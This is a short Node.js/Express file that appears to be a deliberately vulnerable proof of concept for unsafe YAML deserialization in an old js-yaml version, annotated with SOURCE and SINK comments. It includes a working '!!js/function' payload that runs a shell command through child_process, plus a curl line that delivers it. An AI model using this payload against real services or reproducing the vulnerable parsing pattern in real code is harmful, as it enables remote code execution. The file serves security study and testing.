const express = require('express')
const yaml = require('js-yaml') // npm install js-yaml@2.0.4 
const { parse } = require('path')
const app = express()
app.use(express.text())
app.post('/parse', (req, res) => {
  // SOURCE
  const userControlledYaml = req.body
  console.log(userControlledYaml)
  try {
    // SINK
    const parsedData = yaml.load(userControlledYaml)
    const result = parsedData();
    res.json({ "result": result })
  } catch (err) {
    res.status(500).send('error')
  }
})

app.listen(3000)

const maliciousYaml = `
!!js/function >
  function() {
    const cp = global.process.mainModule.require('child_process');
    cp.execSync('calc.exe');
    return "Calculator opened! Exploit succeeded";
  }
`
//curl -X POST http://localhost:3000/parse -H "Content-Type: text/plain" --data-binary @payload.yaml
//node v16.20.0
